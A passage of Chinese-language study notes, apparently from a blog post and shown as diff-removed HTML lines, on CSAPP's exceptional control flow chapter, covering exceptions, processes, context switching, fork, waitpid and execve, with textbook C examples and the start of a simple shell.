-<li>​    前者包括被0除，缺页，内存访问违例，断点及算术溢出。</li>
-<li>​    后者包括系统调用和来自外部IO设备的信号。</li>
-</ul>
-<p>系统启动时，会初始化一张异常表的跳转表，使条目k包含异常k的处理程序地址。</p>
-<p>在运行时，处理器检测到发生了一个事件，并确定了相应的<strong>异常号</strong>k，随后，处理器触发异常，方法是执行间接过程调用，通过异常表的条目k转到相应的处理程序。</p>
-<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/80.png" class="">
-
-<p>异常表的起始地址放在一个叫做<strong>异常表基质寄存器</strong>的特殊CPU寄存器中。</p>
-<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/81.png" class="">
-
-<p>异常处理过程类似于调用但有一些不同：</p>
-<ul>
-<li>过程调用时，在跳转到处理程序之前，处理器将返回地址压入栈中，然而根据异常的类型，返回地址要么是当前指令，要么是下一条指令。</li>
-<li>处理器也把一些额外的处理器状态压入栈里，在处理程序返回时，重新开始执行被中断的程序可能会需要这些状态。</li>
-<li>如果控制从用户程序转移到内核，所有这些项目都被压入栈中，而不是用户栈中。</li>
-<li>异常处理程序运行在内核模式下，意味着它们对所有的系统资源都有完全的访问权限。</li>
-</ul>
-<h5 id="8-1-2-异常的类型"><a href="#8-1-2-异常的类型" class="headerlink" title="8.1.2 异常的类型"></a>8.1.2 异常的类型</h5><p>异常可以分为四类：中断、陷阱、故障、终止。</p>
-<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/84.jpg" class="">
-
-<p><strong>中断：</strong></p>
-<p>中断是<strong>异步</strong>发生的，来自处理器外部的I/O设备的信号的结果。</p>
-<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/82.png" class="">
-
-<p>在当前指令完成执行之后，处理器注意到中断引脚的电压变高了，就从系统总线读取异常号，然后调用适当的中断程序。当处理程序返回时，它就将控制返回给下一条指令。结果就好像程序继续执行，好像没有发生过中断一样。</p>
-<p>剩下的异常类型（陷阱、故障和终止）是同步执行的，是执行当前指令的结果，我们把这类指令叫做<strong>故障指令</strong>。</p>
-<p><strong>陷阱和系统调用:</strong></p>
-<p>陷阱是有意的异常，是执行一条指令的结果。</p>
-<p>陷阱最重要的用途是在用户程序和内核之间提供一个像过程一样的接口，叫做<strong>系统调用</strong>。</p>
-<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/82.5.png" class="">
-
-<p>​    用户程序经常需要向内核请求服务。为了允许对这些服务的受控访问，处理器提供了一条特殊的“syscall n”指令，当用户程序想要请求服务n时，可以执行这条指令。执行syscall指令会导致一个到异常处理程序的陷阱，这个 处理程序解析参数，并调用适当的内核程序。</p>
-<p>​    函数调用是在用户模式，系统调用在内核模式。</p>
-<p><strong>故障和终止：</strong></p>
-<p>故障是由错误情况引起的，它可能被故障处理程序修正。如果被修正，则将控制转移到当前指令。</p>
-<p>如果不可修正，则终止，终止处理程序不会将控制返回给应用程序。将返回一个abort例程，该例程将终止程序。</p>
-<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/83.png" class="">
-
-<h5 id="8-1-3-Linux-x86-64系统中的异常"><a href="#8-1-3-Linux-x86-64系统中的异常" class="headerlink" title="8.1.3 Linux/x86-64系统中的异常"></a>8.1.3 Linux/x86-64系统中的异常</h5><img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/85.png" class="">
-
-<ol>
-<li><p><strong>Linux/x86-64故障和终止：</strong></p>
-<ul>
-<li>除法错误。</li>
-<li>一般保护故障。通常是一个程序引用了一个未定义的虚拟内存空间，或者程序试图写一个只读的文本。Linux shell一般报告为“段故障”</li>
-<li>缺页是会重新执行产生故障的指令的一个异常示例。</li>
-<li>机器检查。机器检查是在导致故障的指令执行中检查到致命的硬件错误时发生的。</li>
-</ul>
-</li>
-<li><p><strong>Linux/x86-64系统调用：</strong></p>
-<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/86.png" class=""></li>
-</ol>
-<h4 id="8-2-进程"><a href="#8-2-进程" class="headerlink" title="8.2 进程"></a>8.2 进程</h4><p>​    在现代操作系统上运行一个程序时，会得到一个假象，就好像程序时目前系统中唯一的程序，程序似乎独占处理器和内存等等假象都通过进程的概念提供给我们的。</p>
-<pre><code> 进程提供给应用程序的关键抽象：
-</code></pre>
-<ul>
-<li>一个独立的逻辑控制流，它提供一个假象，好像我们的程序独占的使用处理器。</li>
-<li>一个私有的地址空间，提供一个假象，好像我们的程序独占的使用内存系统。</li>
-</ul>
-<h5 id="8-2-1-逻辑控制流"><a href="#8-2-1-逻辑控制流" class="headerlink" title="8.2.1 逻辑控制流"></a>8.2.1 逻辑控制流</h5><p>​    即使在系统中通常有许多其他程序在运行，进程也可以像每个程序提供一种假象，好像它在独占的使用处理器，如果想用调试器单步执行程序，会看到一系列PC值，这些值唯一的对应包含在程序的可执行目标文件中的指令，或是包含在运行时动态连接到程序的共享对象的指令，这个PC值的序列叫做<strong>逻辑控制流</strong>。</p>
-<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/87.png" class="">
-
-<h5 id="8-2-2-并发流"><a href="#8-2-2-并发流" class="headerlink" title="8.2.2 并发流"></a>8.2.2 并发流</h5><p>计算机系统中逻辑流有许多不同形式，异常处理程序、进程、信号处理程序、线程等都是逻辑流的例子。</p>
-<p>一个逻辑流的执行在时间上与另一个流重叠，称为<strong>并发流</strong>。</p>
-<p>时间片：一个进程执行它的控制流的一部分的每一时间段。</p>
-<p>多任务：一个进程和其他进程轮流运行（也叫时间分片）</p>
-<p>并发：多个流并发执行的一般现象。</p>
-<p>并行流：两个流并发的运行在不同的处理机核或者计算机上，它们并行地运行。</p>
-<h5 id="8-2-3-私有地址空间"><a href="#8-2-3-私有地址空间" class="headerlink" title="8.2.3 私有地址空间"></a>8.2.3 私有地址空间</h5><p>私有地址空间—进程为程序提供的假象，好像它独占的使用系统地址空间。一般而言，和这个空间中某个地址相关联的那个存储器字节是不能被其他进程读写的。</p>
-<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/88.png" class="">
-
-<h5 id="8-2-4-用户模式和内核模式"><a href="#8-2-4-用户模式和内核模式" class="headerlink" title="8.2.4 用户模式和内核模式"></a>8.2.4 用户模式和内核模式</h5><p>​    处理器提供一种机制，限制一个应用可以执行的指令以及它可以访问的地址空间范围。通常是通过控制某个寄存器的模式位来提供这种功能，该寄存器描述了进程当前享有的特权。</p>
-<ul>
-<li>​    设置模式位之后，进程出域内核模式，也叫做超级用户模式，这个进程可以执行指令集中的任何指令，并且可以访问系统中的任何内存位置。</li>
-<li>​    没有设置模式位，进程运行在用户模式，用户模式中的进程不允许执行特权指令，比如停止处理器、改变模式位、发起IO操作、不允许引用地址空间中内核区的代码和数据，这样的尝试都会引起故障。用户程序必须通过系统调用接口间接的访问内核代码和数据。</li>
-</ul>
-<p> linux提供了一种机制，叫做/proc文件系统，允许用户模式进程访问内核数据结构中的内容。</p>
-<p>/proc文件系统将许多内核数据的内容输出为一个用户程序可以读的文本文件的层次结构。</p>
-<h5 id="8-2-5-上下文切换"><a href="#8-2-5-上下文切换" class="headerlink" title="8.2.5 上下文切换"></a>8.2.5 上下文切换</h5><p>​    操作系统内核使用一种称为上下文切换的较高层次的异常控制流来实现多任务。上下文切换机制是建立在上面讨论过的低层的异常机制上的。</p>
-<p>​    内核为每个进程维持一个<strong>上下文</strong>，上下文就是内核重新启动一个被抢占的进程所需要的状态，由一些对象的值组成，包括通用目的寄存器、浮点寄存器、程序计数器、用户栈、状态寄存器、内存栈和各种内核数据结构，比如描述地址空间的页表、包含当前进程信息的进程表，以及包含进程已打开文件的信息的文件表。</p>
-<p>下图为一对进程上下文切换的示例，进程A初始运行在用户模式在，直到执行系统调用read陷入内核，内核中的陷阱处理程序请求来自磁盘控制器的DMA传输，并安排在磁盘控制器完成从磁盘到内存的数据传输后，磁盘中断处理器：</p>
-<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/89.png" class="">
-
-<p>上下文切换：</p>
-<ol>
-<li>保存当前进程的上下文。</li>
-<li>恢复某个先前被强占的进程被保存的上下文。</li>
-<li>将控制传递给这个新恢复的进程。</li>
-</ol>
-<h4 id="8-3-系统调用错误处理"><a href="#8-3-系统调用错误处理" class="headerlink" title="8.3 系统调用错误处理"></a>8.3 系统调用错误处理</h4><img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/90.png" class="">
-
-<h4 id="8-4-进程控制"><a href="#8-4-进程控制" class="headerlink" title="8.4 进程控制"></a>8.4 进程控制</h4><h5 id="8-4-1-获取进程ID"><a href="#8-4-1-获取进程ID" class="headerlink" title="8.4.1 获取进程ID"></a>8.4.1 获取进程ID</h5><p>每个进程都有唯一的正数（非0）进程ID（PID），getpid函数返回调用进程的PID，getppid函数返回他的父进程的PID（创建调用进程的进程）。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">getpid</span><span class="params">(<span class="keyword">void</span>)</span>；</span></span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">getppid</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br></pre></td></tr></table></figure>
-
-<p>在Linux系统上pid_t被定义为int类型。</p>
-<h5 id="8-4-2-创建和终止进程"><a href="#8-4-2-创建和终止进程" class="headerlink" title="8.4.2 创建和终止进程"></a>8.4.2 创建和终止进程</h5><p>从程序员角度，可以认为进程总是处于下面三种状态之一：</p>
-<ul>
-<li>运行。进程要么在CPU上执行，要么在等待被执行且最终会被内核调度。</li>
-<li>停止。进程的执行被挂起，且不会被调度，当收到SIGSTOP、SIGTSTP、SIGTTIN或者SIGTTOU信号时，进程会停止，并保持停止直到它收到一个SIGCONT信号，在这个时刻，进程再次开始运行。</li>
-<li>终止。进程永远的停止，进程会因为三种原因终止：<ol>
-<li>收到一个信号，该信号的默认行为是终止进程。</li>
-<li>从主程序返回。</li>
-<li>调用exit函数。</li>
-</ol>
-</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exit</span><span class="params">(<span class="keyword">int</span> status)</span></span>;</span><br></pre></td></tr></table></figure>
-
-<p>exit函数以status退出状态来终止进程（另一种设置退出状态的方法是从主程序返回一个整数值）。父进程调用fork函数创建一个新的运行的子进程。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">fork</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br></pre></td></tr></table></figure>
-
-<p>​    新创建的子进程几乎但不完全与父进程相同，子进程得到与父进程用户级虚拟地址空间相同的但是独立的一个副本，包括代码和数据段、堆、共享库以及用户栈。子进程还获得与父进程任何打开文件描述符相同的副本，这就意味着父进程调用fork时，子进程可以读写父进程中打开的任何文件父进程和新创建的子进程最大的区别在于他们有不同的PID。<br>​     fork函数有趣的在于它调用一次，但是会返回两次，一次是在调用进程（父进程）中，一次是在新创建的子进程中。在父进程中fork返回的是子进程的PID，在子进程中fork返回0。因为子进程的PID总是非0，返回值就明确的分辨出程序是在父进程还是在子进程。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;csapp.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">pid_t</span> pid;</span><br><span class="line">	<span class="keyword">int</span> x=<span class="number">1</span>;</span><br><span class="line">	pid=Fork();</span><br><span class="line">	<span class="keyword">if</span>(pid==<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//子进程</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;child:x = %d\n&quot;</span>,++x);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;parent :x=%d\n &quot;</span>,--x);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/91.png" class="">
-
-<p> 从上述可以看到：</p>
-<ol>
-<li><p>调用一次，返回两次。fork函数被父进程调用一次，却返回两次。一次是返回到父进程，一次是返回到新创建的子进程。</p>
-</li>
-<li><p>并发执行。父进程和子进程是并发运行的独立进程，内核能以任意方式交替执行它们的逻辑控制流中的指令。</p>
-</li>
-<li><p>相同但是独立的地址空间。</p>
-</li>
-<li><p>共享文件。子进程共享了父进程打开的文件，stdout。所以子进程输出也是指向屏幕。</p>
-</li>
-</ol>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   Fork();</span><br><span class="line">   Fork();</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">   <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/92.png" class="">
-
-<h5 id="8-4-3-回收子进程"><a href="#8-4-3-回收子进程" class="headerlink" title="8.4.3 回收子进程"></a>8.4.3 回收子进程</h5><p>​    当一个进程由于某种原因终止时，内核并不是立即把它从系统中清除，相反进程被保持在一种已终止的状态中，直到被父进程回收，当父进程回收已终止的子进程时，内核将子进程的退出状态传递给父进程，然后抛弃已终止的进程。从此时开始，该进程就不存在了。一个终止了但没有被回收的进程称为僵尸进程。</p>
-<p>​    如果一个父进程终止了，内核会安排init进程称为它的孤儿进程（如果父进程先退出,子进程还没退出那么子进程将被 托孤给init进程）的养父。init进程的PID为1，是系统在启动时由内核创建的，他不会终止，是所有进程的祖先。如果父进程没有回收它的僵尸进程就终止了，那么内核会安排init进程回收它们，长时间运行的程序，比如shell或者服务器，总是应该回收它们的僵尸子进程，即使僵尸进程没有运行，仍然会消耗系统的内存资源。一个进程可以通过调用waitpid函数等待它的子进程终止或停止。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//成功返回子进程pid，WNOHANG则为0,其他错误-1</span></span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">waitpid</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">int</span> *statusp, <span class="keyword">int</span> options)</span></span>;</span><br></pre></td></tr></table></figure>
-
-<p>默认情况下，options=0时，waitpid挂起调用进程的执行，直到它的等待集合中一个子进程终止，如果等待集合中的一个进程在刚调用的时候就已经终止，那么waitpid立即返回。在这两种情况下，waitpid返回导致waitpid返回的已终止子进程的PID。此时，已终止的子进程已经被回收，内核会从系统中删除掉它的所有痕迹。</p>
-<ol>
-<li><p>判定等待集合的成员</p>
-<ul>
-<li>如果pid&gt;0，那么等待集合就是一个单独的子进程，它的进程ID等于pid</li>
-<li>如果pid=-1，那么等待集合就是由父进程所有的子进程组成</li>
-</ul>
-</li>
-<li><p>修改默认行为</p>
-<p>可以通过将options设置为常量WNOHANG、WUNTRACED和WCONTINUED的各种组合修改默认行为。</p>
-<ul>
-<li>WNOHANG：如果等待集合中的任何子进程都还没有终止，那么就立即返回，返回值为0，默认的行为是挂起调用进程，直到有子进程终止，在等待子进程终止的同时如果还有想做的工作，这个选项会有用。</li>
-<li>WUNTRACED：挂起调用进程的执行，直到等待集合中一个进程变成已终止或者已经被停止，返回的PID为呆滞返回的已终止或被停止的子进程的PID，默认的行为是只返回已终止的子进程。当想要金叉已终止和被停止的子进程时会有用。</li>
-<li>WCONTINUED：挂起调用进程的执行，直到等待集合中一个正在运行的进程终止，或等待集合中和一个被停止的进程收到SIGCONT信号重新开始执行。</li>
-</ul>
-<p>可以用或运算把这些选项组合起来。</p>
-</li>
-<li><p>检查已回收子进程的退出状态</p>
-<p>如果statusp参数是非空的，那么waitpid就会在status中放上关于导致返回子进程的状态信息，status是statusp指向的值。wait.h中定义了status参数的几个宏。</p>
-<ul>
-<li>WIFEXITED：如果子进程调用exit或者返回正常终止，就返回真。</li>
-<li>WEXITSTATUS：返回一个正常终止的子进程的退出状态，只有在WIFEXITED()返回为真时，才定义这个状态。</li>
-<li>WIFSIGNALED：如果子进程是因为一个未被捕获的信号终止的，那么就返回真。</li>
-<li>WTERMSIG：返回导致子进程终止的信号的编号，只有在WIFSIGNALED()返回为真时，才定义这个状态。</li>
-<li>WIFSTOPPED：如果引起返回的子进程当前是停止的，那么返回真。</li>
-<li>WSTOPSIG：返回引起子进程停止的信号的编号。只有在WIFSTOPPED()返回为真才定义这个状态。</li>
-<li>WIFCONTINUED：如果子进程收到SIGCONT信号重新启动，则返回真。</li>
-</ul>
-</li>
-<li><p>错误条件</p>
-<p>如果调用进程没有子进程，那么waitpid返回-1，并设置errno为ECHILD。如果waitpid函数被一个信号中断，那么返回-1，并设置erron为EINTR。</p>
-</li>
-<li><p>wait函数</p>
-<p>wait函数是waitpid函数的简单版本。</p>
-<p>调用wait(&amp;status)等价于调用waitpid(-1,&amp;status,0)。</p>
-</li>
-</ol>
-<h5 id="8-4-4-让进程休眠"><a href="#8-4-4-让进程休眠" class="headerlink" title="8.4.4 让进程休眠"></a>8.4.4 让进程休眠</h5><p>sleep函数将一个进程挂起一段时间。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sleep</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> secs)</span></span>;</span><br></pre></td></tr></table></figure>
-
-<p>如果请求的时间量已经到了，sleep返回0，否则返回还剩下的要休眠的秒数，后一种情况是可能的，如果sleep函数被一个信号中断而过早的返回，还有一个有用的函数是pause函数，该函数让调用函数休眠，直到进程收到一个信号。</p>
-<h5 id="8-4-5-加载并运行程序"><a href="#8-4-5-加载并运行程序" class="headerlink" title="8.4.5 加载并运行程序"></a>8.4.5 加载并运行程序</h5><p>​    execve函数在当前进程的上下文加载并运行一个新程序。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">execve</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">char</span> *<span class="keyword">const</span> argv[], <span class="keyword">char</span> *<span class="keyword">const</span> envp[])</span></span>;</span><br></pre></td></tr></table></figure>
-
-<p>​    execve函数加载并运行可执行目标文件filename，且带参数列表argv和环境变量列表envp。只有当出现错误时，例如找不到filename，execve才会返回到调用程序，所以，与fork一次调用两次返回不同，execve调用一次不返回。</p>
-<p>​    argv变量指向一个以null结尾的指针数组，其中每个指针都指向一个参数字符串，按惯例，argv[0]是可执行文件的名字，环境变量的列表是由一个类似的数据结构表示的，envp变量指向一个以null结尾的指针数组，其中每个指针指向一个环境变量字符串。</p>
-<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/93.png" class="">
-
-<p>在exceve加载了filename之后，调用一些启动代码，启动代码设置栈，并将控制传递给新程序的主函数，该主函数有如下形式：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span>;</span><br></pre></td></tr></table></figure>
-
-<p>​    当main开始执行时，用户的栈组织结构如下图所示，从栈底（高地址）往栈顶（低地址）看，首先是参数和环境字符串，栈网上紧随其后的是以null结尾的指针数组，其中每个指针都指向栈中一个环境变量字符串，全局变量environ指向这些指针中的第一个envp[0]，紧跟环境变量数组之后的是以null结尾的argv[]数组，其中每个元素都指向栈中的一个参数字符串，在栈顶部是系统启动函数libc_start_main的栈帧。</p>
-<img src="/2021/07/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%89/94.png" class="">
-
-<p>main函数又3个参数：</p>
-<ol>
-<li>argc,它给出argv[]数组中非空指针的数目</li>
-<li>argv，指向argv[]数组中的第一条目</li>
-<li>envp，指向envp[]数组中的第一个条目</li>
-</ol>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> **environ;    </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXLINE    1024   <span class="comment">/* max line size */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXARGS     128   <span class="comment">/* max args on a command line */</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unix_error</span><span class="params">(<span class="keyword">char</span> *msg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">eval</span><span class="params">(<span class="keyword">char</span> *cmdline)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="keyword">char</span> **argv)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">parseline</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *cmdline, <span class="keyword">char</span> **argv)</span></span>; </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> cmdline[MAXLINE];</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;tsh&gt; &quot;</span>);</span><br><span class="line">        fgets(cmdline,MAXLINE,<span class="built_in">stdin</span>);</span><br><span class="line">	<span class="keyword">if</span> (feof(<span class="built_in">stdin</span>)) &#123; </span><br><span class="line">	    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	eval(cmdline);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">eval</span><span class="params">(<span class="keyword">char</span> *cmdline)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *argv[MAXLINE];</span><br><span class="line">    <span class="keyword">char</span> buf[MAXLINE];</span><br><span class="line">    <span class="keyword">int</span> bg;                 <span class="comment">/*should the job run in bg or fg?*/</span></span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    </span><br><span class="line">    stpcpy(buf,cmdline);</span><br><span class="line">    bg = parseline(buf,argv);</span><br><span class="line">    <span class="keyword">if</span>(argv[<span class="number">0</span>]==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span>;     <span class="comment">/*ignore empty line*/</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!builtin_cmd(argv))&#123;                         <span class="comment">/*not a build in cmd*/</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>((pid = fork())==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">if</span>(execve(argv[<span class="number">0</span>],argv,environ)&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%s: Command not found. \n&quot;</span>,argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!bg)</span><br><span class="line">        &#123;</span><br><span class="line">        	<span class="keyword">int</span> status;</span><br><span class="line">        	<span class="keyword">if</span>(waitpid(pid, &amp;status, <span class="number">0</span>)&lt;<span class="number">0</span>)</span><br><span class="line">        		unix_error(<span class="string">&quot;waitfg:waitpid\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        	<span class="built_in">printf</span>(<span class="string">&quot;%d %s&quot;</span>,pid,cmdline);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">parseline</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *cmdline, <span class="keyword">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> <span class="built_in">array</span>[MAXLINE]; <span class="comment">/* holds local copy of command line */</span></span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">array</span>;          <span class="comment">/* ptr that traverses command line */</span></span><br><span class="line">    <span class="keyword">char</span> *delim;                <span class="comment">/* points to first space delimiter */</span></span><br><span class="line">    <span class="keyword">int</span> argc;                   <span class="comment">/* number of args */</span></span><br><span class="line">    <span class="keyword">int</span> bg;                     <span class="comment">/* background job? */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(buf, cmdline);</span><br><span class="line">    buf[<span class="built_in">strlen</span>(buf)<span class="number">-1</span>] = <span class="string">&#x27; &#x27;</span>;  <span class="comment">/* replace trailing &#x27;\n&#x27; with space */</span></span><br><span class="line">    <span class="keyword">while</span> (*buf &amp;&amp; (*buf == <span class="string">&#x27; &#x27;</span>)) <span class="comment">/* ignore leading spaces */</span></span><br><span class="line">	buf++;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Build the argv list */</span></span><br><span class="line">    argc = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (*buf == <span 